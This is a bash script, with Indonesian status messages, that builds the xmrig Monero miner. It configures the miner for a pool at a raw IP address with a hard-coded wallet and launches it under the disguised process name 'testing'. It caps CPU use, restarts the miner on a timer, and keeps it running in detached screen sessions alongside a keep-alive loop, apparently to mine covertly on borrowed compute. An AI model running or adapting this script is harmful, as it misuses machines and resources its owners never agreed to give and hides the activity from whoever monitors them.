```bash
#!/bin/bash

set -e

echo "[1] Update & install dependencies..."
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen net-tools systemd

echo "[2] Clone xmrig..."
git clone https://github.com/xmrig/xmrig.git || true

cd xmrig

echo "[3] Build xmrig..."
mkdir -p build
cd build

cmake ..
make -j$(nproc)

echo "[4] Create config.json..."

cat > config.json << 'EOF'
{
    "api": {
        "id": null,
        "worker-id": null
    },

    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },

    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,

    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },

    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "priority": 5,
        "yield": false,
        "asm": true,
        "max-threads-hint": 100
    },

    "opencl": {
        "enabled": false
    },

    "cuda": {
        "enabled": false
    },

    "donate-level": 1,

    "pools": [
        {
            "url": "107.155.109.94:80",
            "user": "483fbQV9MFUQp3VufiihswFWwKV693sWFcEMVEbEE5yVhsT65Re3tgb3SHcJMXwoKDHMaLtYdA5AkdGjCSaxKbzoNRtnr1M",
            "pass": "x",
            "keepalive": true,
            "enabled": true
        }
    ]
}
EOF

echo "[5] Create run_testing.sh..."

cat > run_testing.sh << 'EOF'
#!/bin/bash

CPU_LIMIT="160%"

while true
do
    echo "Starting testing with CPU limit ${CPU_LIMIT}..."

    systemd-run --user --scope \
        -p CPUQuota=${CPU_LIMIT} \
        bash -c 'exec -a testing ./xmrig' &

    PID=$!

    sleep 1500

    echo "Restarting testing..."

    kill $PID 2>/dev/null || true
    sleep 5
    kill -9 $PID 2>/dev/null || true

    sleep 2
done
EOF

chmod +x run_testing.sh

echo "[6] Create test.sh..."

cat > test.sh << 'EOF'
#!/bin/bash

while true
do
    echo "===== $(date) ====="

    echo "--- ip a ---"
    ip a

    echo "--- ifconfig ---"
    ifconfig

    echo "===================="

    sleep 240
done
EOF

chmod +x test.sh

echo "[7] Create keepalive.sh..."

cat > keepalive.sh << 'EOF'
#!/bin/bash

while true
do
    date > /dev/null
    echo "keep-alive $(date)"
    sleep 60
done
EOF

chmod +x keepalive.sh

echo "[8] Start screen sessions..."

screen -dmS testing bash -c "./run_testing.sh"
screen -dmS test bash -c "./test.sh"
screen -dmS keepalive bash -c "./keepalive.sh"

echo ""
echo "=============================="
echo "✅ Setup selesai!"
echo ""
echo "CPU limit:"
echo "2 core x 80% = 160%"
echo ""
echo "Cek CPU:"
echo "htop"
echo ""
echo "Cek screen:"
echo "screen -ls"
echo ""
echo "Masuk screen:"
echo "screen -r testing"
echo "screen -r test"
echo "screen -r keepalive"
echo "=============================="
```
